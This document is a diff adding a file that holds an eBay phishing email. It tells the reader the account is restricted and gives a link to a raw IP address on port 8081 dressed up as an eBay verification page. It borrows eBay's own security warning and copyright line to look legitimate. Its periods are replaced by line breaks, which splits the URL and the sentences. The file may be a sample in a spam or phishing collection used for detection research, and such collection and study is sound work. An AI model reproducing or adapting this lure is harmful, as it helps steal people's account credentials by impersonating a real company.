@@ -1,0 +1,27 @@
+Dear eBay User,
+ 
+During our regular update and verification of the accounts, we could not verify your current information
+ Either your information has changed or it is incomplete
+
+As a result, your access to bid or buy on eBay has been restricted
+ To start using your eBay account again, please update and verify your information by clicking the link below :
+
+http://202
+124
+172
+69:8081/eBayISAPI
+html
+&MfcISAPICommand=EnterConfirm&UsingSSL=0&pUserId=&ru=445&ap=0&dz=1
+
+Thank you very much for your cooperation
+
+eBay Customer Support 
+Remember: eBay will not ask you for sensitive personal information (such as your password, credit card and bank account numbers, social security number, etc
+) 
+in an email
+ 
+Copyright 1995 - 2006 eBay Inc
+ All rights reserved
+ Designated 
+trademarks and brands are the property of their respective owners
+
